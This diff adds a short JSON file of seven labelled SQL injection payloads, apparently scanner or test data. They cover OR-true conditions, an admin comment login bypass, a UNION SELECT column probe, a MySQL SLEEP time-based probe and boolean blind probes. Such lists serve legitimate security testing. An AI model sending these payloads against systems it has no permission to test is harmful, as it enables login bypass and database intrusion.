@@ -1,0 +1,30 @@
+[
+  {
+    "payload": "' OR '1'='1",
+    "label": "OR true single-quote"
+  },
+  {
+    "payload": "' OR 1=1--",
+    "label": "OR 1=1 comment"
+  },
+  {
+    "payload": "admin'--",
+    "label": "admin comment bypass"
+  },
+  {
+    "payload": "' UNION SELECT NULL,NULL--",
+    "label": "UNION 2 cols"
+  },
+  {
+    "payload": "' AND SLEEP(2)--",
+    "label": "MySQL time-based blind"
+  },
+  {
+    "payload": "' AND 1=1--",
+    "label": "blind TRUE"
+  },
+  {
+    "payload": "' AND 1=2--",
+    "label": "blind FALSE"
+  }
+]
